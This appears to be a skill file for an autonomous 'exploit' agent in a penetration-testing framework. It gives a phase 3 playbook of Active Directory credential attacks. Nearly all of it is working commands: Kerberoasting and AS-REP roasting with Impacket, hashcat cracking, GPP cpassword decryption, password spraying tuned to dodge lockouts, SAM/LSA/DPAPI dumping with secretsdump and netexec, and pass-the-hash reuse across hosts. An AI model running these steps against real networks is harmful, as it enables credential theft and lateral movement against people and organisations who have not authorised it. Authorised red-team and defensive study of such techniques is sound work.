---
name: credential-attacks
version: 1.0.0
description: Credential attack techniques for Phase 3 — Kerberoasting, AS-REP Roasting, GPP passwords, password spraying, DPAPI, SAM/LSA/LSASS dumping, and credential relay with obtained creds
phase: 3
agent: exploit
mitre: T1558.003, T1558.004, T1552, T1003, T1110
ocd_branch: "Valid Creds"
---

# Credential Attacks — Phase 3 Reference

## Decision Tree

```
START (valid domain credentials obtained)
  |
  v
1. Kerberoasting (GetUserSPNs) -----> Crack with hashcat 13100
  |                                    Priority: service accounts with DA paths
  v
2. AS-REP Roasting (GetNPUsers) ----> Crack with hashcat 18200
  |                                    Priority: accounts without Kerberos preauth
  v
3. GPP Passwords (SYSVOL mining) ---> Decrypt cpassword (gpp-decrypt)
  |                                    Priority: legacy GPOs with embedded creds
  v
4. Password Spraying ----------------> Controlled spray with lockout avoidance
  |                                    Priority: discovered usernames + common passwords
  v
5. DPAPI Extraction -----------------> Decrypt stored credentials from compromised hosts
  |                                    Priority: hosts where local admin obtained
  v
6. SAM/LSA/LSASS Dump --------------> secretsdump on compromised hosts
  |                                    Priority: every host with admin access
  v
7. Credential Relay -----------------> Relay captured creds to additional targets
```

## 1. Kerberoasting (T1558.003)

Request TGS tickets for service accounts and crack offline. Target service accounts
with SPNs — especially those with paths to Domain Admin (check BloodHound first).

```bash
# Enumerate Kerberoastable accounts
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request \
  | tee -a loot/phase3/kerberoast_$DOMAIN.out

# Target specific high-value account
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request \
  -target-user $SVC_ACCOUNT | tee -a loot/phase3/kerberoast_$SVC_ACCOUNT.out

# Crack TGS hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules /usr/share/hashcat/rules/best64.rule \
  | tee -a loot/phase3/hashcat_kerberoast.out
```

**Target prioritization:**
1. Service accounts with paths to DA (BloodHound: "Shortest Path from Kerberoastable Users")
2. Service accounts in privileged groups (Domain Admins, Backup Operators, Server Operators)
3. Service accounts with unconstrained delegation
4. Any remaining SPN-bearing accounts

## 2. AS-REP Roasting (T1558.004)

Accounts without Kerberos pre-authentication can have their AS-REP encrypted
part cracked offline. Rarer than Kerberoasting but free credentials when found.

```bash
# With a user list (from LDAP enum or BloodHound)
GetNPUsers.py $DOMAIN/ -no-pass -usersfile loot/phase3/domain_users.txt \
  -dc-ip $DC -format hashcat | tee -a loot/phase3/asrep_$DOMAIN.out

# With valid creds (enumerate DONT_REQ_PREAUTH flag)
GetNPUsers.py $DOMAIN/$USER:$PASS -dc-ip $DC -request \
  | tee -a loot/phase3/asrep_$DOMAIN.out

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules /usr/share/hashcat/rules/best64.rule \
  | tee -a loot/phase3/hashcat_asrep.out
```

## 3. GPP Passwords (T1552.006)

Group Policy Preferences can contain embedded credentials (cpassword) in
SYSVOL. Microsoft published the AES key — all GPP passwords are trivially
decryptable.

```bash
# Search SYSVOL for GPP XML files with cpassword
netexec smb $DC -u $USER -p $PASS -M gpp_password \
  | tee -a loot/phase3/gpp_passwords_$DC.out

# Manual SYSVOL enumeration
smbclient //$DC/SYSVOL -U "$DOMAIN\\$USER%$PASS" \
  -c "recurse ON; prompt OFF; mget *Groups.xml *Services.xml *Scheduledtasks.xml *Datasources.xml" \
  | tee -a loot/phase3/sysvol_gpp_$DC.out

# Decrypt cpassword (if found manually)
gpp-decrypt "$CPASSWORD" | tee -a loot/phase3/gpp_decrypted.out
```

## 4. Password Spraying (T1110.003)

Controlled spraying against discovered accounts. ALWAYS check password policy
FIRST to avoid lockouts.

```bash
# Check password policy (lockout threshold + observation window)
netexec smb $DC -u $USER -p $PASS --pass-pol \
  | tee -a loot/phase3/password_policy_$DC.out

# Spray (ONE password at a time, wait between attempts)
# If lockout threshold = 5, max 3 attempts per observation window
netexec smb $DC -u loot/phase3/domain_users.txt -p 'Season2026!' \
  --no-bruteforce | tee -a loot/phase3/spray_$DC.out

# Common spray passwords: Season+Year!, Company+Year!, Welcome1, Password1
# Wait: observation_window_minutes between each password attempt
```

**Lockout avoidance rules:**
- Read password policy FIRST — never spray blind
- Max attempts = lockout_threshold - 2 (safety margin)
- Wait full observation window between spray rounds
- Use ONE password per round across ALL users
- Exclude already-compromised and locked accounts

## 5. DPAPI Credential Extraction (T1555.004)

Decrypt Windows DPAPI-protected credentials from compromised hosts. Requires
local admin or the user's plaintext password / NTLM hash.

```bash
# Extract DPAPI master keys + credentials via secretsdump
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase3/dpapi_secretsdump_$TARGET.out

# NetExec DPAPI module
netexec smb $TARGET -u $USER -p $PASS -M dpapi \
  | tee -a loot/phase3/dpapi_nxc_$TARGET.out
```

## 6. SAM/LSA/LSASS Dumping (T1003.001, T1003.002, T1003.004)

Extract local hashes, cached domain credentials, and LSA secrets from
compromised hosts. Requires local admin access.

```bash
# Full dump: SAM + LSA + cached creds
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase3/secretsdump_$TARGET.out

# SAM only (local accounts)
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET -sam \
  | tee -a loot/phase3/sam_dump_$TARGET.out

# NetExec mass credential harvesting
netexec smb loot/phase3/admin_hosts.txt -u $USER -p $PASS \
  --sam | tee -a loot/phase3/nxc_sam_mass.out

netexec smb loot/phase3/admin_hosts.txt -u $USER -p $PASS \
  --lsa | tee -a loot/phase3/nxc_lsa_mass.out
```

## 7. Credential Relay With Obtained Creds

Use compromised credentials to relay or authenticate to additional targets.

```bash
# Test credential reuse across hosts
netexec smb loot/phase1/live_hosts.txt -u $USER -p $PASS \
  | tee -a loot/phase3/cred_reuse_$USER.out

# Test with NTLM hash
netexec smb loot/phase1/live_hosts.txt -u $USER -H $HASH \
  | tee -a loot/phase3/pth_reuse_$USER.out

# WinRM access check
netexec winrm loot/phase1/live_hosts.txt -u $USER -p $PASS \
  | tee -a loot/phase3/winrm_check_$USER.out
```

## Hashcat Mode Reference

| Hash Type | Mode | Source | Example Command |
|-----------|------|--------|-----------------|
| Kerberos 5 TGS-REP (Kerberoast) | 13100 | GetUserSPNs | `hashcat -m 13100 hash.txt wordlist` |
| Kerberos 5 AS-REP (AS-REP Roast) | 18200 | GetNPUsers | `hashcat -m 18200 hash.txt wordlist` |
| NetNTLMv2 | 5600 | Responder/relay | `hashcat -m 5600 hash.txt wordlist` |
| NetNTLMv1 | 5500 | Responder/relay | `hashcat -m 5500 hash.txt wordlist` |
| NTLM (raw) | 1000 | SAM/secretsdump | `hashcat -m 1000 hash.txt wordlist` |
| DCC2 (cached domain) | 2100 | LSA/cached | `hashcat -m 2100 hash.txt wordlist` |
| Kerberos 5 TGS-REP (AES-256) | 19700 | GetUserSPNs | `hashcat -m 19700 hash.txt wordlist` |

## Operational Notes

- Save all captured credentials to `loot/credentials/hashes/` with descriptive filenames
- Every cracked credential should be tested for reuse immediately
- Track credential provenance: which host/technique yielded each credential
- On Pi5 ARM64: hashcat GPU unavailable — use CPU mode or offload to operator workstation
- If hashcat is slow on Pi: save hashes, notify Zero, request operator-side cracking
